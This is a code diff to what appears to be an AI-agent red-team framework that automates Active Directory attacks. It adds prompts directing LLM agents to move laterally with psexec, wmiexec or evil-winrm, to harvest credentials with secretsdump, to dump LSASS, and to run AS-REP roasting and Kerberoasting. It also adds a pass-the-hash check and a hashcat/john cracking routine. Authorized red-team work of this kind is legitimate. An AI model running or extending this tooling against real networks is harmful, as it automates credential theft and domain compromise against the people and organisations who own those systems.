@@ -34,13 +34,31 @@ from ares.core.messages import (
     MessageType,
     OperationComplete,
 )
-from ares.core.models import AgentRole
+from ares.core.models import AgentRole, SharedRedTeamState
 from ares.core.redis_client import create_redis_client
 from ares.core.task_queue import RedisTaskQueue, TaskMessage
 from ares.tools.red import CrackerCallbackTools, LateralCallbackTools
+from ares.tools.red.network import CrackingTools
 
 if TYPE_CHECKING:
     from dreadnode.agent import Agent
+
+
+def _is_pass_the_hash_compatible(hash_value: str | None) -> bool:
+    if not hash_value:
+        return False
+    normalized = hash_value.strip()
+    if "$" in normalized:
+        return False
+    if ":" in normalized:
+        parts = normalized.split(":")
+        if len(parts) != 2:
+            return False
+        lm_part, ntlm_part = parts
+        if lm_part and not re.fullmatch(r"[0-9a-fA-F]{32}", lm_part):
+            return False
+        return bool(re.fullmatch(r"[0-9a-fA-F]{32}", ntlm_part))
+    return bool(re.fullmatch(r"[0-9a-fA-F]{32}", normalized))
 
 
 async def discover_active_operation(  # noqa: PLR0912
@@ -300,9 +318,11 @@ TASK_PROMPTS: dict[MessageType, callable] = {
     MessageType.LATERAL_REQUEST: lambda msg: (
         f"Perform lateral movement to {msg.target_host}:\n"
         f"Username: {msg.domain}\\{msg.username}\n"
-        f"Credential: {'password' if msg.password else 'hash'}\n"
+        f"Credential ({'password' if msg.password else 'hash'}): "
+        f"{msg.password or msg.hash_value or 'N/A'}\n"
         f"Method: {msg.method or 'auto-select'}\n"
         f"Task ID: {msg.task_id}\n\n"
+        "Use the exact credential value above; do not substitute placeholders. "
         "Try to establish access using psexec, evil-winrm, or wmi. "
         "If successful, run secretsdump to harvest credentials. "
         "Report the result using task_complete."
@@ -322,9 +342,11 @@ TASK_PROMPTS: dict[MessageType, callable] = {
         f"Domain: {msg.domain}\n"
         f"Targets: {', '.join(msg.target_ips) if msg.target_ips else 'N/A'}\n"
         f"Username: {msg.username or 'N/A'}\n"
-        f"Credential: {'password' if msg.password else 'hash' if msg.hash_value else 'none'}\n"
+        f"Credential ({'password' if msg.password else 'hash' if msg.hash_value else 'none'}): "
+        f"{msg.password or msg.hash_value or 'N/A'}\n"
         f"Techniques: {', '.join(msg.techniques) if msg.techniques else 'auto-select'}\n"
         f"Task ID: {msg.task_id}\n\n"
+        "Use the exact credential value above; do not substitute placeholders. "
         "Prioritize GetNPUsers/AS-REP roast, Kerberoast, secretsdump, and LSASS "
         "if credentials allow. Report any hashes or credentials using task_complete."
     ),
@@ -380,20 +402,26 @@ def generate_prompt_from_task(task: TaskMessage) -> str | None:
             f"Type: {payload['hash_type']}\n"
             f"Wordlist: {payload.get('wordlist', 'rockyou.txt')}\n"
             f"Task ID: {task.task_id}\n\n"
-            "Use hashcat or john to crack. Report when done."
+            "Use hashcat or john to crack. "
+            "When cracked, call report_cracked_credential(task_id, username, password, hash, domain). "
+            "If cracking fails, call report_crack_failed(task_id, hash, reason)."
         )
 
     if task.task_type == "lateral":
         cred_type = "password" if payload.get("password") else "hash"
+        cred_value = payload.get("password") or payload.get("hash_value") or "N/A"
         return (
             f"Perform lateral movement to {payload['target_host']}:\n"
             f"Username: {payload.get('domain', '')}\\{payload['username']}\n"
-            f"Credential: {cred_type}\n"
+            f"Credential ({cred_type}): {cred_value}\n"
             f"Method: {payload.get('method') or 'auto-select'}\n"
             f"Task ID: {task.task_id}\n\n"
-            "Try at most two methods (psexec then winrm/wmi), no loops. "
-            "If access succeeds, run secretsdump once. "
-            "If access fails, report_lateral_failed with a concise reason."
+            "Use the exact credential value above; do not substitute placeholders. "
+            "Try psexec, then wmiexec or evil-winrm if needed. "
+            "If access succeeds, run secretsdump to harvest credentials. "
+            "Call report_lateral_success(task_id, target, method, new_credentials, new_hashes) "
+            "with any credentials/hashes found as JSON. "
+            "If access fails, call report_lateral_failed(task_id, target, reason)."
         )
 
     if task.task_type == "acl_analysis":
@@ -409,6 +437,15 @@ def generate_prompt_from_task(task: TaskMessage) -> str | None:
         )
 
     if task.task_type == "credential_access":
+        hash_value = payload.get("hash_value")
+        hash_is_pth = _is_pass_the_hash_compatible(hash_value)
+        techniques = payload.get("techniques", []) or []
+        if hash_value and not hash_is_pth:
+            techniques = [
+                technique
+                for technique in techniques
+                if technique.lower() not in {"secretsdump", "lsassy"}
+            ]
         cred_type = (
             "password"
             if payload.get("password")
@@ -417,14 +454,37 @@ def generate_prompt_from_task(task: TaskMessage) -> str | None:
             else "none"
         )
         targets = payload.get("target_ips") or []
+        dc_ip = payload.get("dc_ip") or ""
+        reason = payload.get("reason") or ""
+        source = payload.get("credential_source") or ""
+        hash_type = payload.get("hash_type") or ""
+        reason_line = f"Reason: {reason}\n" if reason else ""
+        source_line = f"Credential Source: {source}\n" if source else ""
+        hash_type_line = f"Hash Type: {hash_type}\n" if hash_type else ""
+        hash_note = ""
+        if hash_value and not hash_is_pth:
+            cred_type = "hash (non-NTLM)"
+            hash_note = (
+                "NOTE: Provided hash is not NTLM pass-the-hash compatible; "
+                "do not attempt secretsdump/lsassy with it.\n"
+            )
         return (
             "Perform credential access against the target environment:\n"
             f"Domain: {payload.get('domain', '')}\n"
             f"Targets: {', '.join(targets) if targets else 'N/A'}\n"
+            f"DC IP: {dc_ip or 'N/A'}\n"
             f"Username: {payload.get('username') or 'N/A'}\n"
-            f"Credential: {cred_type}\n"
-            f"Techniques: {', '.join(payload.get('techniques', [])) or 'auto-select'}\n"
+            f"Credential ({cred_type}): {payload.get('password') or payload.get('hash_value') or 'N/A'}\n"
+            f"{hash_type_line}"
+            f"{source_line}"
+            f"{reason_line}"
+            f"Techniques: {', '.join(techniques) or 'auto-select'}\n"
             f"Task ID: {task.task_id}\n\n"
+            f"{hash_note}"
+            "Use the exact credential value above; do not substitute placeholders. "
+            "If DC IP is provided, pass -dc-ip to Kerberos/LDAP tools to avoid DNS issues. "
+            "If SMB access exists (guest or creds), enumerate shares, spider files, "
+            "download/upload for staging, and check WinRM/RDP reachability (5985/5986, 3389). "
             "Prioritize GetNPUsers/AS-REP roast, Kerberoast, secretsdump, and LSASS "
             "if credentials allow. Report any hashes or credentials."
         )
@@ -530,6 +590,7 @@ class RedisWorkerAgent:
         redis_url: str | None = None,
         pointer_check_interval: float = 30.0,
         max_operation_age: int = 300,
+        shared_state: Any | None = None,
     ):
         self.role = role
         self.task_queue = task_queue
@@ -540,11 +601,13 @@ class RedisWorkerAgent:
         self.redis_url = redis_url
         self.pointer_check_interval = pointer_check_interval
         self.max_operation_age = max_operation_age
+        self.shared_state = shared_state
         self._running = False
         self._current_task: str | None = None
         self._tasks_completed = 0
         self._pointer_switched = False
         self._run_agent_in_thread = self.role == AgentRole.ACL
+        self._state_refresh_client = None
 
     def _run_agent_sync(self, prompt: str) -> Any:
         """Run the async agent in a dedicated event loop (thread-safe helper)."""
@@ -689,9 +752,14 @@ class RedisWorkerAgent:
         )
 
         try:
+            await self._refresh_shared_state()
             # Handle "command" tasks directly via subprocess (no agent needed)
             if task.task_type == "command":
                 await self._execute_command_task(task)
+                return
+            # Handle crack tasks directly (avoid LLM stalls for deterministic cracking)
+            if task.task_type == "crack":
+                await self._execute_crack_task(task)
                 return
 
             # Generate prompt from task
@@ -733,6 +801,40 @@ class RedisWorkerAgent:
                         result_payload["hash"] = filtered[0]
                     else:
                         result_payload["hashes"] = filtered
+
+            stop_reason = getattr(result, "stop_reason", None)
+            if task.task_type == "credential_access" and stop_reason == "stalled":
+                result_payload.setdefault(
+                    "summary",
+                    "Credential access stalled after exhausting available techniques with current credentials.",
+                )
+                result_payload.setdefault(
+                    "next_steps",
+                    [
+                        "Provide additional credentials or hashes.",
+                        "Provide known file paths on accessible shares to target.",
+                        "Authorize exploitation or privilege escalation attempts.",
+                        "Expand scope/targets or upload additional tooling.",
+                    ],
+                )
+                if not agent_error:
+                    agent_error = "Credential access stalled; no new credentials found."
+
+            if task.task_type == "lateral" and stop_reason == "stalled":
+                result_payload.setdefault(
+                    "summary",
+                    "Lateral movement stalled after exhausting available methods with current credentials.",
+                )
+                result_payload.setdefault(
+                    "next_steps",
+                    [
+                        "Provide additional credentials or hashes.",
+                        "Provide a specific lateral method to try (psexec/wmiexec/winrm).",
+                        "Confirm target reachability and required ports.",
+                    ],
+                )
+                if not agent_error:
+                    agent_error = "Lateral movement stalled; no access achieved."
 
             if agent_error:
                 if "Maximum steps reached" in agent_error:
@@ -863,6 +965,208 @@ class RedisWorkerAgent:
                 logger.warning(f"[{self.agent_name}] Failed to record task status: {status_error}")
         finally:
             self._current_task = None
+
+    async def _refresh_shared_state(self) -> None:
+        if not self.redis_url or not self.operation_id:
+            return
+        try:
+            if self._state_refresh_client is None:
+                self._state_refresh_client = await create_redis_client(
+                    self.redis_url, decode_responses=False
+                )
+            key = f"ares:operation:{self.operation_id}:state"
+            data = await self._state_refresh_client.get(key)
+            if not data:
+                return
+            fresh = SharedRedTeamState.from_bytes(data)
+            self._merge_shared_state(fresh)
+        except Exception as e:
+            logger.debug(f"[{self.agent_name}] Failed to refresh shared state: {e}")
+
+    def _merge_shared_state(self, fresh: SharedRedTeamState) -> None:
+        if self.shared_state is None:
+            self.shared_state = fresh
+            return
+        current = self.shared_state
+        for attr in (
+            "operation_id",
+            "target",
+            "started_at",
+            "all_domains",
+            "all_credentials",
+            "all_hashes",
+            "all_hosts",
+            "all_users",
+            "all_shares",
+            "all_weaknesses",
+            "discovered_vulnerabilities",
+            "exploited_vulnerabilities",
+            "pending_tasks",
+            "completed_tasks",
+            "completed",
+            "has_domain_admin",
+            "has_golden_ticket",
+            "domain_admin_path",
+            "registered_agents",
+            "operation_timeline",
+            "identified_techniques",
+            "pending_credential_findings",
+        ):
+            setattr(current, attr, getattr(fresh, attr))
+
+        # Merge dynamic tracking attributes (set via object.__setattr__)
+        # These track queried hosts and tested credentials to avoid duplicates
+        for dynamic_attr in ("_queried_hosts", "_tested_credentials"):
+            fresh_value = getattr(fresh, dynamic_attr, None)
+            if fresh_value is not None:
+                current_value: set = getattr(current, dynamic_attr, set())
+                merged = current_value | fresh_value
+                object.__setattr__(current, dynamic_attr, merged)
+
+    async def _execute_crack_task(self, task: TaskMessage) -> None:
+        payload = task.payload or {}
+        hash_value = payload.get("hash_value", "")
+        hash_type = (payload.get("hash_type") or "").upper()
+        username = payload.get("username", "")
+        domain = payload.get("domain", "")
+        wordlist_path = self._resolve_wordlist_path(
+            payload.get("wordlist") or "/usr/share/wordlists/rockyou.txt"
+        )
+
+        if not hash_value:
+            await self.task_queue.send_result(
+                task_id=task.task_id,
+                success=False,
+                error="Missing hash_value in crack task payload",
+                worker_pod=self.pod_name,
+            )
+            return
+
+        crack_tools = CrackingTools()
+        if self.shared_state is not None:
+            crack_tools.set_state(self.shared_state)
+
+        hashcat_mode = 13100
+        john_format = "krb5tgs"
+        if hash_type in {"AS-REP", "ASREP", "KRB5ASREP"}:
+            hashcat_mode = 18200
+            john_format = "krb5asrep"
+        elif hash_type == "NTLM":
+            hashcat_mode = 1000
+            john_format = "ntlm"
+
+        hashcat_time_limit: int | None = 10
+        if hash_type in {"AS-REP", "ASREP", "KRB5ASREP"}:
+            hashcat_time_limit = None
+
+        output = await crack_tools.crack_with_hashcat(
+            hash_value=hash_value,
+            hashcat_mode=hashcat_mode,
+            wordlist_path=wordlist_path,
+            max_time_minutes=hashcat_time_limit,
+            use_dynamic_wordlist=False,
+        )
+        password = self._extract_cracked_password(hash_value, output)
+
+        if not password:
+            output = await crack_tools.crack_with_hashcat(
+                hash_value=hash_value,
+                hashcat_mode=hashcat_mode,
+                wordlist_path=wordlist_path,
+                use_dynamic_wordlist=True,
+            )
+            password = self._extract_cracked_password(hash_value, output)
+
+        if not password:
+            output = await crack_tools.crack_with_john(
+                hash_value=hash_value,
+                hash_format=john_format,
+                wordlist_path=wordlist_path,
+                use_dynamic_wordlist=False,
+            )
+            password = self._extract_cracked_password(hash_value, output)
+
+        if not password:
+            output = await crack_tools.crack_with_john(
+                hash_value=hash_value,
+                hash_format=john_format,
+                wordlist_path=wordlist_path,
+                use_dynamic_wordlist=True,
+            )
+            password = self._extract_cracked_password(hash_value, output)
+
+        result_payload: dict[str, Any] = {
+            "output": output,
+            "task_type": task.task_type,
+        }
+        if password:
+            result_payload["credential"] = {
+                "username": username,
+                "password": password,
+                "domain": domain,
+                "source": f"cracked:{self.agent_name}",
+            }
+            result_payload["hash"] = {
+                "username": username,
+                "hash_value": hash_value,
+                "hash_type": hash_type or "NTLM",
+                "domain": domain,
+                "cracked_password": password,
+            }
+            await self.task_queue.send_result(
+                task_id=task.task_id,
+                success=True,
+                result=result_payload,
+                worker_pod=self.pod_name,
+            )
+            return
+
+        await self.task_queue.send_result(
+            task_id=task.task_id,
+            success=False,
+            result=result_payload,
+            error="Cracking failed: no password found",
+            worker_pod=self.pod_name,
+        )
+
+    def _resolve_wordlist_path(self, wordlist_path: str) -> str:
+        """Resolve wordlist path, decompressing .gz if needed."""
+        if not os.path.isabs(wordlist_path):  # noqa: PTH117
+            wordlist_path = os.path.join("/usr/share/wordlists", wordlist_path)  # noqa: PTH118
+        if os.path.exists(wordlist_path) or wordlist_path.endswith(".gz"):
+            return wordlist_path
+        gz_path = f"{wordlist_path}.gz"
+        if not os.path.exists(gz_path):
+            return wordlist_path
+        import tempfile
+
+        tmp_wordlist = os.path.join(tempfile.gettempdir(), os.path.basename(wordlist_path))  # noqa: PTH118, PTH119
+        if os.path.exists(tmp_wordlist):
+            return tmp_wordlist
+        try:
+            import gzip
+            import shutil
+
+            with gzip.open(gz_path, "rb") as src, open(tmp_wordlist, "wb") as dst:
+                shutil.copyfileobj(src, dst)
+            logger.info(
+                "[%s] Decompressed wordlist %s to %s", self.agent_name, gz_path, tmp_wordlist
+            )
+            return tmp_wordlist
+        except Exception as exc:
+            logger.warning(
+                "[%s] Failed to decompress wordlist %s: %s", self.agent_name, gz_path, exc
+            )
+            return wordlist_path
+
+    @staticmethod
+    def _extract_cracked_password(hash_value: str, output: str) -> str:
+        if not output:
+            return ""
+        for line in output.splitlines():
+            if hash_value in line and ":" in line:
+                return line.rsplit(":", 1)[-1].strip()
+        return ""
 
     async def _check_for_pointer_switch(self) -> bool:
         """Return True if a switch is requested and the worker should exit."""
@@ -1643,6 +1947,7 @@ async def run_worker(  # noqa: PLR0912
                     redis_url=redis_url,
                     pointer_check_interval=pointer_check_interval,
                     max_operation_age=max_operation_age,
+                    shared_state=shared_state,
                 )
                 logger.info(f"Starting Redis worker for role {role.value}")
             else:
